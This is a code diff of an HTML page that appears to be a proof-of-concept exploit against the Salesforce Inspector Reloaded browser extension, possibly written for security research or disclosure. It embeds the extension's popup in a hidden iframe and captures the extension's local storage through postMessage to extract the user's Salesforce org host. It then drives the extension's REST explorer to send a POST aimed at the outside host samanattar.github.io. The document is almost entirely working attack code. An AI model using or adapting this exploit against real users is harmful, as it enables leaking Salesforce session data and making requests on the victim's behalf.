@@ -4,54 +4,75 @@
     <title>SFDC Inspector Reloaded</title>
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
-        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; }
-        #endpoint { 
-            margin-top: 20px;
-            padding: 15px;
+        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
+        #requestInfo { 
             background: #e3f2fd;
+            padding: 15px;
             border-radius: 4px;
-        }
-        iframe {
-            width: 100%;
-            height: 500px;
             margin-top: 20px;
-            border: 1px solid #ddd;
         }
+        pre { white-space: pre-wrap; }
     </style>
 </head>
 <body>
     <div id="messages">Loading...</div>
-    <div id="endpoint"></div>
+    <div id="requestInfo"></div>
     <script>
         const messagesDiv = document.getElementById('messages');
-        const endpointDiv = document.getElementById('endpoint');
+        const requestInfoDiv = document.getElementById('requestInfo');
         
+        function makeRequest(url) {
+            const xhr = new XMLHttpRequest();
+            
+            xhr.open('POST', url, true);
+            
+            xhr.onreadystatechange = function() {
+                requestInfoDiv.innerHTML += `
+                    <h3>Request State ${xhr.readyState}:</h3>
+                    <pre>Status: ${xhr.status}</pre>
+                    <pre>Headers: ${xhr.getAllResponseHeaders()}</pre>
+                    <pre>Response: ${xhr.responseText}</pre>
+                `;
+            };
+            
+            xhr.onerror = function(e) {
+                requestInfoDiv.innerHTML += `
+                    <h3>Error:</h3>
+                    <pre>${JSON.stringify(e, null, 2)}</pre>
+                `;
+            };
+            
+            try {
+                xhr.send();
+            } catch(e) {
+                requestInfoDiv.innerHTML += `
+                    <h3>Send Error:</h3>
+                    <pre>${e.toString()}</pre>
+                `;
+            }
+        }
+
         window.addEventListener('message', function(event) {
             if (event.data.insextInitRequest) {
                 messagesDiv.innerHTML = '<pre>Init Request: ' + JSON.stringify(event.data, null, 2) + '</pre>';
                 
                 const storage = event.data.iFrameLocalStorage;
-                // Find first key that ends with _orgInstance
                 const hostKey = Object.keys(storage).find(key => key.endsWith('_orgInstance'));
                 
                 if (hostKey) {
-                    // Extract the host URL by removing _orgInstance
                     const hostUrl = hostKey.replace('_orgInstance', '');
-                    
-                    // Construct the full URL
                     const fullUrl = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/rest-explore.html?host=${hostUrl}&method=POST&endpoint=samanattar.github.io`;
                     
-                    endpointDiv.innerHTML = `
-                        <h3>Extracted Information:</h3>
-                        <pre>Host URL: ${hostUrl}</pre>
-                        <pre>Full Endpoint: ${fullUrl}</pre>
-                        <iframe src="${fullUrl}"></iframe>
+                    requestInfoDiv.innerHTML = `
+                        <h3>Attempting request to:</h3>
+                        <pre>${fullUrl}</pre>
                     `;
+                    
+                    makeRequest(fullUrl);
                 }
             }
         });
 
-        // Initial iframe for getting localStorage data
         const initFrame = document.createElement('iframe');
         initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
         initFrame.style.display = 'none';
